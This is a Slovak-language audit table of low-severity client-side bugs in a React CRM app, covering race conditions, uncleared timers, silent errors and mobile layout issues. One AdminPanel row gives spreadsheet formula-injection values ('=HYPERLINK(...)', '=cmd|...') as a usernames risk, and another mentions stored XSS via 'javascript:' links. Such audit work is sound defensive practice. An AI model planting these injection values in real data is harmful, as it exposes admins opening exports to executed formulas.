| NÍZKA | `client/src/components/NotificationPreferences.jsx:69` | Súbežné prepnutie dvoch toggle-ov: odpoveď prvého prepíše optimistický stav druhého | Blikanie/preklápanie checkboxov pri rýchlom klikaní, používateľ si nie je istý výsledným stavom. | `1546167f` |
| NÍZKA | `client/src/components/NotificationToast.jsx:6` | localStorage sa číta bez try/catch počas renderu (NotificationToast aj PushNotificationToggle) | Výnimka v renderi NotificationToast (mountovaný v App.jsx:534 pre každého prihláseného) zhodí celý React strom → biela obrazovka; v toggle-i pád pri otvorení nastavení. | `ba719485` |
| NÍZKA | `client/src/components/OAuthButtons.jsx:48` | 30-sekundový safety timer po natívnom OAuth sa pri odmountovaní nezruší | setState po unmounte (React 18 bez varovania); drobný únik časovača. | `fbc01d98` |
| NÍZKA | `client/src/components/UserMenu.jsx:394` | Kopírovanie feed URL volá navigator.clipboard bez guardu a bez čakania na výsledok | Používateľ dostane potvrdenie o skopírovaní, hoci schránka je prázdna; v starších WebView chyba v handleri. | `9376d0fd` |
| NÍZKA | `client/src/components/UserMenu.jsx:1109` | Upload avatara cez XMLHttpRequest s callbackmi namiesto async/await; bez timeoutu a bez abort/timeout handlera | Ťažšie udržiavateľný callback kód; pri timeoute/abortu zostane používateľ bez spätnej väzby (žiadny spinner sa síce netočí, ale ani chyba sa neukáže). | `62e9eb8b` |
| NÍZKA | `client/src/components/UserMenu.jsx:1331` | Mobilné prepnutie prostredia bez try/catch → pri chybe tichý unhandled rejection | Používateľ na mobile klepne na iné prostredie, nič sa nestane, bez spätnej väzby; opakované klepnutia posielajú ďalšie POST /switch. | `80f9b80b` |
| NÍZKA | `client/src/components/UserMenu.jsx:1643` | „Uložiť zmeny“ a „Zmeniť heslo“ nemajú in-flight stav → dvojité odoslanie | Pri zmene hesla druhý request zlyhá na „nesprávne aktuálne heslo“ (prvý ho už zmenil) a prepíše správu o úspechu chybou — používateľ nevie, či sa heslo zmenilo; zároveň rate-limit `passwordChangeLimiter` (auth.js:839) sa míňa zby… | `3ed4397c` |
| NÍZKA | `client/src/components/UserMenu.jsx:2232` | Potvrdzovacie modály .workspace-leave-overlay nemajú scroll-lock tela (iOS scroll bleed) | Na iOS Safari/WKWebView a Android WebView sa pri otvorenom deštruktívnom potvrdení scrolluje stránka pod overlayom (scroll bleed), modal sa posúva mimo stred, tlačidlá „Áno, opustiť / vymazať“ môžu vypadnúť z obrazovky. | `3e475417` |
| NÍZKA | `client/src/components/WorkspaceSwitcher.jsx:127` | Zlyhanie prepnutia prostredia sa ticho prehltne bez spätnej väzby | Používateľ opakovane kliká na prostredie bez výsledku a bez informácie, prečo (napr. že už nie je členom). | `1f36f1ce` |
| NÍZKA | `client/src/context/AuthContext.jsx:105` | setLoading(false) pri token=null okamzite ukonci cakanie na BroadcastChannel - novy tab blikne /login a strati cielovu URL | Otvorenie odkazu do appky v novom tabe (Ctrl+klik, odkaz z emailu pri uz prihlasenom tabe) konci na Dashboarde namiesto cielovej stranky a s viditelnym bliknutim prihlasovacieho formulara. | `201f249f` |
| NÍZKA | `client/src/main.jsx:56` | Tlacidlo 'Obnovit stranku' v AppErrorBoundary stranku neobnovi - len resetne stav a strom sa vacsinou zrúti znova | Pouzivatel klika na tlacidlo bez efektu a nema inu cestu von (ide o najvyssi boundary - pod nim nic neostane). | `f5f42108` |
| NÍZKA | `client/src/pages/AcceptInvite.jsx:66` | Effect závisí od nememoizovanej switchWorkspace → opakované fetch-e pozvánky pri každom renderi WorkspaceProvider | 4-5 duplicitných GET /api/workspaces/invitation/:token pri otvorení pozvánky (verejný, neautentifikovaný endpoint → zbytočná záťaž + riziko rate-limitu), blikanie loading stavu, pri `alreadyAccepted` zbytočné opakované POST /swit… | `abfad5d2` |
| NÍZKA | `client/src/pages/AcceptInvite.jsx:79` | Presmerovanie po prijatí pozvánky cez nezrušený setTimeout; zlyhanie switchWorkspace po úspešnom prijatí zobrazí chybu | Zavádzajúca chybová hláška po úspešnom prijatí (druhý pokus skončí 404 „Pozvánka nenájdená“), prípadná navigácia po unmounte. | `6dc316c8` |
| NÍZKA | `client/src/pages/AcceptInvite.jsx:164` | Odkaz „prplcrm.eu“ v iOS inštrukciách sa v appke neotvorí v Safari, ale skočí na /app | Neprihlásený používateľ iOS appky s pozvánkou klikne na odkaz → appka ho vyhodí z pozvánky na /app (login screen) a registráciu na webe nikdy neuvidí; inštrukcia je zavádzajúca a tok prijatia pozvánky na iOS zlyháva. | `7c404b51` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:586` | Výber používateľov (checkedIds) sa neresetuje pri zmene strany/filtra – hromadná akcia zasiahne skryté riadky | Riziko neúmyselnej hromadnej zmeny plánu/role používateľom mimo aktuálneho pohľadu. | `55527b6a` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:593` | Detail fetch-e bez ochrany pred stale odpoveďou (rýchle kliknutie na dva riadky) | Zobrazenie nesprávneho detailu (vrátane editorov predplatného/zľavy, ktoré potom cielia `userDetail.user._id`). | `ccbe8b5b` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:778` | Export CSV používateľov/workspace-ov: .then bez .catch → unhandled rejection a žiadna spätná väzba | Tichý fail exportu + falošné záznamy v Diagnostika → Chyby (šum pre skutočné chyby). | `9e548be9` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:2696` | Klientský CSV export bez ochrany proti CSV/formula injection (audit log, porovnanie, emaily) | Používateľ si môže nastaviť username/názov workspace na `=HYPERLINK(...)` alebo `=cmd\|'...'!A1`; admin po otvorení exportu v tabuľkovom procesore dostane spustený vzorec/klik na škodlivý odkaz. | `b5ae6096` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:3354` | ActivityFeed: pri prázdnom feede sa auto-refresh nikdy nespustí | Falošný „live“ indikátor; admin čaká na aktivitu, ktorá sa bez reloadu nezobrazí. | `c571173e` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:3717` | Hodinový graf API metrík zobrazuje UTC hodiny ako lokálne | Chybná interpretácia peak hodín pri dennom checku. | `62fcfb9c` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:5575` | Expirácia promo kódu z datetime-local sa posiela bez časovej zóny → server ju berie ako UTC | Platnosť promo kódov je posunutá voči zadaniu; kód platí dlhšie, ako admin zamýšľal. | `89ff7e9d` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:6666` | Diagnostika → Chyby: search sa refetchuje pri každom znaku a Enter/„Hľadať“ spúšťa duplicitný request | Zbytočné requesty na /api/admin/errors + /errors/stats pri písaní; možnosť zobrazenia staršej odpovede. | `4c2a709d` |
| NÍZKA | `client/src/pages/AdminPanel.jsx:7086` | Diagnostika → Aktívni polluje každých 15 s aj pri schovanom tabe | Zbytočná záťaž API a batérie, keď admin nechá tab otvorený na pozadí. | `1ed64564` |
| NÍZKA | `client/src/pages/Attachments.jsx:49` | Po prepnutí workspace ostáva výber súborov (selected) z predošlého prostredia | Mätúce UI (tlačidlo bez efektu, prekvapivo predvybrané súbory po návrate) – bez bezpečnostného dopadu, export používa len viditeľné položky. | `e8a2a4ca` |
| NÍZKA | `client/src/pages/AuthCallback.jsx:123` | Race v connect móde: druhý useEffect odnaviguje skôr než 600 ms timer pridá ?connected=provider | Po úspešnom pripojení Google/Apple účtu v Nastaveniach používateľ nedostane potvrdenie „Google účet pripojený.“ (ConnectedAccounts.jsx:29-33) – správanie je náhodné podľa rýchlosti API. | `fbc01d98` |
| NÍZKA | `client/src/pages/AuthCallback.jsx:129` | 8-sekundový timeout po OAuth prihlásení zobrazí „Prihlásenie zlyhalo“ počas cold-startu servera, hoci prihlásenie prebehne | Pri studenom štarte API (bežné na Render free/starter) dostane používateľ po Google/Apple logine falošnú chybu; časť ich skúsi login znova a vytvorí zbytočné OAuth kolá. | `fbc01d98` |
| NÍZKA | `client/src/pages/AuthCallback.jsx:244` | Ľubovoľný text z URL parametra ?message= sa zobrazí ako chybová hláška appky (content spoofing) | Phishing/sociálne inžinierstvo s dôveryhodným vzhľadom aplikácie; žiadny priamy únik dát. | `fbc01d98` |
| NÍZKA | `client/src/pages/BillingPage.jsx:49` | fetchData potichu zahodí chybu – stránka fakturácie bez plánov a bez možnosti opakovať | Používateľ vidí prázdnu stránku fakturácie bez vysvetlenia; nevie, či je problém dočasný, a nemá ako obnoviť dáta bez reloadu. | `f63d1f31` |
| NÍZKA | `client/src/pages/BillingPage.jsx:74` | Časovače po návrate zo Stripe (2 s /me refresh, 8 s skrytie bannera) sa pri odchode zo stránky nerušia | Zbytočná sieťová požiadavka a setState mimo životného cyklu; pri rýchlom prepínaní stránok drobné nekonzistencie. | `f63d1f31` |
| NÍZKA | `client/src/pages/CRM.jsx:293` | Zlyhanie načítania kontaktov sa potichu zahodí a zobrazí sa „Žiadne kontakty – začnite pridaním“ | Používateľ na slabom signáli si myslí, že mu zmizli všetky kontakty, bez možnosti „Skúsiť znova“; pri aktívnom filtri dostane nesprávnu výzvu. | `d9d8b3fc` |
| NÍZKA | `client/src/pages/CRM.jsx:613` | deleteContact potichu zahodí chybu – používateľ nedostane spätnú väzbu | Pri 403/404/5xx alebo výpadku siete kontakt ostane v zozname a používateľ nevie, že mazanie zlyhalo (opakuje klik, hľadá chybu inde). | `b9baf42f` |
| NÍZKA | `client/src/pages/CRM.jsx:735` | Dva rôzne zoznamy textových prípon (.txt chýba v isTextFile) a lokálny formatFileSize tieni import | Textový súbor sa pre niektoré mimetypy nezobrazí hoci je stiahnutý; pri chýbajúcej veľkosti sa ukáže „NaN MB“. | `2b091954` |
| NÍZKA | `client/src/pages/CRM.jsx:782` | openPreview nemá zrušenie – oneskorená odpoveď prepíše náhľad iného súboru / nastaví stav po zatvorení | Prechodne sa pod názvom súboru B zobrazí obsah súboru A (nesprávny náhľad), a po zatvorení modalu ostane blob URL v pamäti až do ďalšieho náhľadu/unmountu (ťažšie na iOS WKWebView). | `993b4ee2` |
| NÍZKA | `client/src/pages/CRM.jsx:1183` | ~700 riadkov nedosiahnuteľného kódu projektov/úloh v CRM.jsx (renderCRMSubtasks sa nikde nerenderuje) | Tretina 2232-riadkového komponentu je balast: každý render alokuje nepoužívané closures, audit aj údržba sú ťažšie a mŕtve vetvy obsahujú vlastné chyby (napr. r. 1051, 1147 hlášky bez diakritiky), ktoré budú zavádzať pri budúcich… | `24ca9bbe` |
| NÍZKA | `client/src/pages/CRM.jsx:1704` | Tlačidlo „+ Nový kontakt“ v prázdnom stave otvára mobilný sidebar cez formulár | Na telefóne musí používateľ po kliknutí najprv zavrieť panel, až potom vidí formulár – mätúce najmä pri prvom použití (prázdny workspace). | `22172553` |
| NÍZKA | `client/src/pages/CRM.jsx:1719` | Pád celej stránky Kontakty pri kontakte bez mena (contact.name.charAt bez guardu) | Jediný kontakt s `name` null/undefined (legacy dokument, import, chybný alebo zámerný API request člena workspace) zhodí render celej CRM stránky pre všetkých členov workspace (TypeError → ErrorBoundary), kým sa kontakt neopraví … | `d20a5853` |
| NÍZKA | `client/src/pages/CRM.jsx:1802` | getContactTasks sa počíta pre každý kontakt pri každom renderi – O(kontakty × globálne projekty) | Trhané písanie do vyhľadávania a pomalý re-render zoznamu na slabších Android zariadeniach pri väčších workspace-och. | `edd18a44` |
| NÍZKA | `client/src/pages/Dashboard.jsx:170` | Dashboard počúva socket event 'new-message', ktorý server nikdy neemituje | Používateľ na Dashboarde vidí zastarané počty a zoznam správ (napr. nová čakajúca správa sa neobjaví), hoci kontakty a projekty sa live aktualizujú — nekonzistentné správanie na všetkých platformách. | `6840ad12` |
| NÍZKA | `client/src/pages/Dashboard.jsx:1059` | Dashboard zobrazuje náhľad msg.body, ale model správy má iba description — kód je mŕtvy | Chýbajúci náhľad obsahu správ v Dashboarde (funkčný nedostatok maskovaný mŕtvym kódom). | `ff1616f2` |
| NÍZKA | `client/src/pages/Dashboard.jsx:1434` | Opakované O(kontakty × projekty) výpočty priamo v renderi Dashboardu | Pri stovkách kontaktov a projektov desaťtisíce iterácií na každý render; viditeľné zasekávanie na slabších Android telefónoch pri klikaní v detaile. | `231c6e57` |
| NÍZKA | `client/src/pages/ForgotPassword.jsx:20` | forgot-password a reset-password POSTy sa pri timeoute automaticky opakujú – viacnásobné e-maily / falošná chyba „token neplatný“ | Mätúce správanie pri obnove hesla na pomalej sieti; zbytočné e-maily a rate-limit blokácie. | `6505b425` |
| NÍZKA | `client/src/pages/IapBilling.jsx:46` | IapBilling pri zlyhaní API nezobrazí chybu (prázdny grid) a každý external IAP update prepne celú stránku na „Načítavam…“ | iOS používateľ nevie, prečo nevidí plány; blikanie na spinner počas nákupu pôsobí ako chyba. | `f0719e5f` |
| NÍZKA | `client/src/pages/LandingPage.css:109` | Hamburger menu a cookie tlačidlá na landingu majú dotykový cieľ pod 44 px | Ťažšie trafiteľné menu a súhlas s cookies na mobile; vyššia miera chybných dotykov. | `36d52145` |
| NÍZKA | `client/src/pages/LandingPage.css:219` | Poradie min-height: 100dvh / 100vh je obrátené – 100vh vždy prepíše dvh fallback | Hero sekcia na mobilných prehliadačoch s meniacim sa panelom je vyššia než viditeľný viewport (odrezaný spodok, skok pri scrolle). | `c673ee30` |
| NÍZKA | `client/src/pages/LandingPage.css:1319` | Cookie banner (position: fixed) ignoruje safe-area-inset-bottom | Tlačidlá cookie lišty sú na iPhone X+ v PWA čiastočne pod home indikátorom – ťažko stlačiteľné. | `ffa76b15` |
| NÍZKA | `client/src/pages/LandingPage.jsx:21` | Kontaktný formulár ide cez axios interceptor, ktorý POST pri timeoute/sieťovej chybe opakuje až 3× – duplicitné e-maily | Duplicitné správy v supporte a falošné chybové hlásenie používateľovi pri pomalej sieti/cold-starte. | `d22d2633` |
| NÍZKA | `client/src/pages/LandingPage.jsx:84` | Mobilné menu neuzamyká scroll pozadia ani nereaguje na Escape | Pri otvorenom menu sa pozadie posúva a po zavretí je používateľ inde na stránke; drobná prístupnostná medzera. | `76d2614b` |
| NÍZKA | `client/src/pages/Login.jsx:293` | Prepínač Prihlásenie/Registrácia je <a href="#"> bez preventDefault – pridáva „#“ a extra záznam v histórii | Nekonzistentná história a URL na prihlasovacej stránke; na mobile (TWA/standalone) back gesto vracia na „rovnakú“ stránku. | `64392853` |
| NÍZKA | `client/src/pages/Login.jsx:309` | Odkaz na zásady ochrany údajov bez koncovej lomky vyvolá dvojité načítanie stránky | Dve navigácie a bliknutie obsahu pri otvorení zásad z prihlasovacej stránky; na pomalej sieti citeľné oneskorenie. | `64392853` |
| NÍZKA | `client/src/pages/Messages.jsx:205` | Príloha ku komentáru: stav a nápoveda existujú, ale UI na výber súboru chýba | Používatelia hľadajú neexistujúcu funkciu podľa nápovedy; mŕtvy stav a prop-drilling v komponente. | `1839e278` |
| NÍZKA | `client/src/pages/Messages.jsx:401` | fetchMessages bez ochrany proti zastaranej odpovedi pri rýchlom prepínaní záložiek | Záložka ukazuje správy z inej záložky (napr. v „Odoslané“ sú prijaté správy), kým nepríde ďalší refetch. | `60688c4c` |
| NÍZKA | `client/src/pages/Messages.jsx:693` | Hlasovanie v ankete bez in-flight guardu — dvojité ťuknutie hlas zruší | Používateľ si myslí, že hlasoval, ale výsledok je bez jeho hlasu (alebo opačne); zároveň sa pošlú dve notifikácie protistrane. | `edf20e10` |
| NÍZKA | `client/src/pages/Messages.jsx:961` | Dotykové ciele pod 44 px: filtre stavu, ikonky úpravy/mazania komentára, reakcie | Na telefóne sa ťažko trafí správny filter alebo ikona; omylom sa ťukne na 🗑️ namiesto ✏️ (mazanie komentára je síce za confirm, ale frustruje). | `4143071c` |
| NÍZKA | `client/src/pages/Messages.jsx:1029` | Race condition pri otvorení správy — oneskorená odpoveď znovu otvorí/prepíše detail | Na pomalej mobilnej sieti sa po stlačení Späť detail „vráti“ sám od seba, alebo sa pri rýchlom preklikávaní zobrazí obsah inej správy než tej, na ktorú používateľ klikol. | `4efe6592` |
| NÍZKA | `client/src/pages/Messages.jsx:1049` | Modal Nová správa: bez triedy modal-overlay (žiadny iOS zámok scrollu) a maxHeight 90vh namiesto dvh | Na iPhone sa pri dlhšom formulári nedá spoľahlivo dostať na tlačidlo Odoslať / Zrušiť a pozadie „uteká“ pri scrollovaní; pri otvorenej klávesnici je problém výraznejší. | `1d46a769` |
| NÍZKA | `client/src/pages/Messages.jsx:1268` | Záložka Všetky používa texty pre Odoslané (Pre: … a prázdny stav) | Mätúce zobrazenie odosielateľa v predvolenom pohľade — používateľ nevie, od koho správa je, bez rozkliknutia. | `60b01fc4` |
| NÍZKA | `client/src/pages/Messages.jsx:1577` | Stiahnutie legacy prílohy: .then bez .catch — neošetrené odmietnutie a žiadna spätná väzba | Po kliknutí na stiahnutie sa nič nestane bez vysvetlenia (napr. plan-gate alebo zmazaný súbor), v konzole unhandled rejection. | `1d4e2438` |
| NÍZKA | `client/src/pages/Messages.jsx:1813` | Enter v komentári odosiela — na dotykovej klávesnici sa nedá vložiť nový riadok | Na mobiloch (väčšina natívnych používateľov) sa komentár nedá formátovať do odsekov a často odíde predčasne. | `1839e278` |
| NÍZKA | `client/src/pages/ResetPassword.jsx:28` | Klientska validácia resetu hesla (min. 6 znakov) nesedí so serverovou politikou (min. 8, písmeno + číslo) | Používateľ zadá heslo podľa pokynu na obrazovke a dostane až po odoslaní serverovú chybu – zmätočná UX pri citlivom toku obnovy hesla. | `6505b425` |
| NÍZKA | `client/src/pages/ResetPassword.jsx:42` | Odložená navigácia na /login po úspešnom resete sa pri odchode z komponentu nezruší | Duplicitný záznam v histórii / nečakané presmerovanie; kozmetické, ale ľahko odstrániteľné. | `6505b425` |
| NÍZKA | `client/src/pages/Tasks.jsx:543` | Denný pohľad kalendára posiela do onTaskClick rodičovský task namiesto položky — klik na podúlohu neotvorí podúlohu | V dennom pohľade (cieľ po kliku na deň v mesačnom pohľade) klik na podúlohu rozbalí len projekt, bez rozbalenia stromu a zvýraznenia podúlohy — používateľ ju musí hľadať ručne. Nekonzistentné s ostatnými pohľadmi. | `a0b609f2` |
| NÍZKA | `client/src/pages/Tasks.jsx:675` | useSocket() otvára samostatné Socket.io spojenie pre každý komponent — Tasks je jedným z 8 konzumentov | Násobná záťaž servera (socket autorizácia, miestnosti) a batérie na mobile; po 5 neúspešných reconnectoch (dlhší offline) prestane Tasks dostávať realtime udalosti až do reloadu. | `8711c3e2` |
| NÍZKA | `client/src/pages/Tasks.jsx:790` | fetchTasks bez ochrany proti zastaranej odpovedi — súbežné volania môžu prepísať novší stav starším | Po prepnutí workspacu alebo rýchlej sérii zmien sa môže krátkodobo zobraziť zoznam iného workspacu alebo stav pred mutáciou (zmiznutá podúloha, 'vrátený' checkbox) až do ďalšieho refetchu. | `d84fa473` |
| NÍZKA | `client/src/pages/Tasks.jsx:1073` | new Date('YYYY-MM-DD') sa parsuje ako UTC polnoc — v zápornom UTC offsete sa termín posunie o deň | Nesprávna farba termínu, úloha 'po termíne' o deň skôr, položka v kalendári na zlom dni a v 'Moje úlohy' v zlej skupine — pre používateľov v zápornom UTC offsete. | `24b8ff3a` |
| NÍZKA | `client/src/pages/Tasks.jsx:1856` | addSubtask bez ochrany proti dvojitému odoslaniu — duplicitné podúlohy na pomalej sieti | Vznikajú duplicitné podúlohy, ktoré musí používateľ ručne mazať; pri Free pláne zbytočne spotrebúvajú limit podúloh. | `7f077994` |
| NÍZKA | `client/src/pages/Tasks.jsx:2772` | Drag-and-drop poradie: optimistická zmena bez rollbacku/resyncu pri chybe servera | Používateľ si myslí, že poradie uložil; po reloade/na inom zariadení je iné. Žiadna informácia o chybe. | `e6b85cff` |
| NÍZKA | `client/src/pages/Tasks.jsx:3206` | Banner filtra kontaktu ukazuje 'Načítavam...' natrvalo, ak kontakt v zozname neexistuje | Používateľ vidí prázdny zoznam s nekonečným 'Načítavam...' bez vysvetlenia; musí sám nájsť tlačidlo 'Zrušiť filter'. | `31d939ac` |
| NÍZKA | `client/src/pages/Tasks.jsx:3378` | Každá zmena stavu prekreslí všetky karty projektov vrátane rekurzívnych stromov podúloh | Pri desiatkach projektov s hlbokými stromami je písanie na mobile trhané (každý znak = plný re-render listu). | `7bb64f82` |
| NÍZKA | `client/src/pages/Tasks.jsx:3857` | Tlačidlo 'Duplikovať' nie je počas requestu zablokované — dvojklik vytvorí dva duplikáty | Dvojklik na pomalej sieti vytvorí 2 kópie projektu (vrátane podúloh) pre každý vybraný kontakt. | `bd908479` |
| NÍZKA | `client/src/pages/TermsOfService.jsx:162` | Krížový odkaz v bode 10.2 VOP nepoužíva privacyLink – stráca ?from=register | Z registrácie → VOP → Zásady sa používateľ tlačidlom vráti na hlavnú stránku namiesto do registračného formulára. | `1d216268` |
| NÍZKA | `client/src/pages/UserAffiliate.jsx:92` | UserMenu dostáva prop onUpdateUser, ale očakáva onUserUpdate – zmeny profilu/avataru sa na affiliate stránke nepropagujú | Keď si používateľ na /app/affiliate zmení meno/avatar, AuthContext.user sa neaktualizuje – hlavička a ostatné komponenty ukazujú staré údaje až do reloadu. | `f8e9b5c5` |
| NÍZKA | `client/src/pages/UserAffiliate.jsx:161` | Formulár bankových údajov: fixné 2 stĺpce na úzkych displejoch a IBAN pole bez atribútov proti autokorekcii | Nepohodlné a chybové zadávanie IBAN na mobile pri citlivom údaji pre výplatu provízií. | `1988d89e` |
| NÍZKA | `client/src/pages/WorkspaceMembers.jsx:61` | Zlyhanie načítania členov sa ticho prehltne → stránka ukazuje „Aktívni členovia (0)“ bez chyby a bez retry | Používateľ (najmä na mobile s horším signálom) vidí falošný stav „0 členov“, môže si myslieť, že bol z prostredia odstránený alebo že členovia zmizli; nemá možnosť skúsiť znova bez reloadu. | `919f2e28` |
| NÍZKA | `client/src/pages/WorkspaceMembers.jsx:229` | Nesprávny názov propu onUpdateUser → zmeny profilu/avatara sa nepremietnu do AuthContext | Po uložení profilu alebo nahratí/zmazaní avatara zo stránky Správa tímu ostane v hlavičke staré meno/avatar; `user.avatarTimestamp` sa nezvýši, takže `<img ...?t=...>` ďalej ukazuje cache-ovaný obrázok (server posiela `Cache-Cont… | `3e463132` |
| NÍZKA | `client/src/services/pushNotifications.js:161` | initializePush pridáva pri každom volaní nový 'message' listener a nikdy ho neodstráni | Pri `PUSH_SUBSCRIPTION_CHANGED` zo service workera sa N-krát pošle POST /api/push/subscribe, resp. N-krát zavolá `subscribeToPush()` (paralelné `pushManager.subscribe`), čo zbytočne zaťažuje server a môže vyvolať chyby pri súbežn… | `46630072` |
| NÍZKA | `client/src/styles/index.css:306` | Neplatná deklarácia `box-shadow: 0 4px 12px var(--shadow)` | Kontextové menu blokov sa vykresľuje bez tieňa (len border), vizuálne splýva s obsahom; neplatné CSS. | `1c8f9fe1` |
| NÍZKA | `client/src/styles/index.css:613` | Chýba `prefers-reduced-motion` — nekonečné animácie bežia aj pri vypnutých animáciách v OS | Prístupnosť (vestibulárne poruchy) a zbytočná spotreba batérie/CPU na mobiloch; iOS „Obmedziť pohyb“ a Android „Odstrániť animácie“ sa ignorujú. | `151565d4` |
| NÍZKA | `client/src/styles/index.css:3023` | Spodok user-menu dropdownu na mobile končí za spodnou navigáciou | Posledné položky menu (napr. „Odhlásiť sa“) sú na telefónoch po doscrollovaní prekryté spodnou navigáciou — nedajú sa kliknúť bez zatvorenia menu. | `cdce137b` |
| NÍZKA | `client/src/styles/index.css:8324` | Nedefinované CSS premenné `--success-color` a `--bg-tertiary` | Indikátor „aktívna synchronizácia kalendára“ v nastaveniach sa nikdy nezobrazí (zelená bodka chýba), textová náhľadová oblasť nemá pozadie. | `1c8f9fe1` |
| NÍZKA | `client/src/styles/index.css:8743` | Toast kontajner ignoruje `env(safe-area-inset-top)` v standalone PWA | V iOS home-screen PWA sú notifikačné toasty čiastočne prekryté status barom, tlačidlo × je ťažko dostupné. | `b755f6de` |
| NÍZKA | `client/src/styles/index.css:9624` | Checkbox podúlohy má na mobile len 24×24 px — pod odporúčaných 44 px | Dokončenie podúlohy na telefóne je nepresné; netrafený ťuk rozbalí/zbalí strom namiesto dokončenia. | `2dbde661` |
| NÍZKA | `client/src/styles/index.css:11219` | Dark-mode override bez existencie tmavej témy znižuje kontrast kalendára | Používatelia s tmavým režimom OS (bežné na Androide/iOS) vidia v kalendári časové odznaky s kontrastom ~1.9:1 (nečitateľné) a hodinové linky denného pohľadu takmer neviditeľné (biela 8 % na bielej). | `48672bf3` |
| NÍZKA | `client/src/utils/breadcrumbs.js:127` | Patchnuty console.error/warn skladaju spravu mimo try - String(a) na objekte bez prototypu hodi a zhodi volajuceho | Volanie console.error/warn (vratane volani z kniznic) moze samo vyhodit vynimku a prerusit beziaci handler. | `5abcbc0e` |
| NÍZKA | `client/src/utils/breadcrumbs.js:149` | ui.click breadcrumb uklada innerText klikanych prvkov (az 200 znakov) - do error reportov sa dostavaju mena kontaktov a obsah sprav | Osobne udaje zakaznikov (mena, telefony, uryvky sprav) v logoch chyb mimo ich workspace-u; komplikuje GDPR (ucel/retencia logov). | `bc6037fa` |
| NÍZKA | `client/src/utils/fileDownload.js:117` | Web vetva downloadBlob revokuje blob URL hneď po click() – Safari môže sťahovanie zrušiť | Používateľ Safari/iOS PWA klikne „Stiahnuť“ (CRM.jsx:678, ContactDetail, FilePreviewModal:146, Messages, Tasks, CSV export CRM.jsx:698) a sťahovanie potichu zlyhá alebo uloží prázdny súbor, bez hlášky. | `d811f339` |
| NÍZKA | `client/src/utils/reportError.js:263` | JSON.stringify(reason) v unhandledrejection handleri moze hodit (cyklicky objekt, BigInt) a vyvolat druhotnu chybu | Strata povodneho dovodu rejectu v Diagnostike, zavadzajuca sekundarna chyba. | `83f0ee5b` |
| NÍZKA | `client/src/utils/uploadQueue.js:413` | emit() pri každej progress udalosti dekóduje JWT a re-renderuje indikátor aj bez zmeny percenta | Zbytočná CPU práca a re-rendery počas nahrávania 50 MB videa na slabšom telefóne; batéria/plynulosť UI. | `ecfd8889` |
| NÍZKA | `client/vite.config.js:38` | Po deployi padá lazy načítanie chunkov v otvorených taboch bez automatického zotavenia | Po každom nasadení vidia aktívni používatelia pri prvej navigácii chybovú obrazovku namiesto plynulého prechodu; v PWA/TWA to pôsobí ako pád aplikácie. | `b9f1c39a` |
| INFO | `client/public/manifest.json:12` | `orientation: portrait-primary` zamyká tablety v PWA/TWA na výšku | Používatelia tabletov s klávesnicou/stojanom nemôžu používať aplikáciu na šírku v nainštalovanej verzii, hoci web layout to podporuje. | `e661489c` |
| INFO | `client/public/robots.txt:18` | robots.txt nezakazuje všetky interné SPA cesty | Aplikačné URL sa môžu indexovať ako duplicitný/prázdny obsah s nesprávnym canonical; forgot/reset-password stránky v SERP. | `b817726f` |
| INFO | `client/src/App.jsx:51` | RouteFallback a LoadingGate pouzivaju height: 100vh - na mobilnom Safari/WKWebView je obsah mimo stredu a stranka sa da posuvat | Kozmeticky posun loadera a nezelany scroll pocas nacitavania na mobile. | `f1b2cec1` |
| INFO | `client/src/api/adminApi.js:16` | adminApi cita/maze sessionStorage bez try/catch v interceptoroch | Admin panel v dotknutej konfiguracii prehliadaca nefunguje bez zrozumitelnej chyby. | `82161922` |
| INFO | `client/src/components/ContactDetail.jsx:263` | ContactDetail renderuje href priamo z contact.website bez kontroly schémy (javascript: URL) – komponent je nepoužívaný | Ak by sa komponent niekedy zapojil, člen workspace by mohol vložiť `javascript:` odkaz a spustiť kód v relácii kolegu (stored XSS v rámci tenanta). | `0572c6f3` |
| INFO | `client/src/components/FileRenameModal.jsx:84` | Pole názvu nemá maxLength – server názov potichu oreže na 200 znakov | Dlhý názov sa uloží orezaný bez upozornenia; používateľ to zistí až v zozname. | `d4c0049d` |
| INFO | `client/src/components/NotificationPreferences.jsx:55` | Načítanie preferencií cez .then/.catch/.finally reťazec namiesto async/await | Nekonzistentný štýl; žiadny funkčný dopad. | `f81beea5` |
| INFO | `client/src/components/NotificationToast.jsx:42` | Timery na automatické zatvorenie toastov sa pri unmounte nerušia | setState na odmontovanom komponente (React 18 to ticho ignoruje, ale timery a closure žijú ďalej); pri rýchlom login/logout cykle alebo nápore notifikácií ostávajú visieť desiatky timerov. | `2843bd41` |
| INFO | `client/src/components/PageView.jsx:56` | Mŕtve komponenty z Notion éry: PageView, Block, Sidebar, Toast (+Toast.css) sa nikde neimportujú | Žiadny dopad na runtime (kód sa nebundluje, Vite ho tree-shake-ne), ale mätie audit a údržbu a v prípade oživenia by priniesol vyššie uvedené chyby. | `7e8dabf3` |
| INFO | `client/src/components/PushPermissionBanner.jsx:78` | Cleanup vrátený z async IIFE v useEffect je mŕtvy kód — timer sa nikdy nezruší | Kód vyzerá, že čistí timer, ale nečistí — pri unmounte do 2 s ostane bežať zbytočný timer; zavádzajúci vzor, ktorý sa ľahko skopíruje inde bez `cancelled` ochrany. | `ec79c47f` |
| INFO | `client/src/components/Toast.css:2` | Mŕtvy Toast.jsx/Toast.css koliduje názvami tried s NotificationToast | Dnes bez efektu (súbor sa nenačíta), ale pri budúcom použití by si dva toast systémy navzájom prepisovali štýly a animácie; mŕtvy kód mätie údržbu. | `9d686ac5` |
| INFO | `client/src/components/UserMenu.jsx:232` | Mŕtvy kód: 16× nepoužitá premenná `token` a nepoužité importy | Šum pri čítaní a lint warningy; zavádza, že token sa posiela ručne (pozostatok pred zavedením `authHeaders`). | `47e0d8d0` |
| INFO | `client/src/context/WorkspaceContext.jsx:134` | fetchWorkspaces nema ochranu proti zastaranej odpovedi - pomaly GET /workspaces/current prepise vysledok neskorsieho switchWorkspace | Nekonzistentny stav - header ukazuje ine prostredie nez to, z ktoreho sa nacitavaju data (presne trieda bugov popisana v komentaroch r. 13-19). | `72b99fe1` |
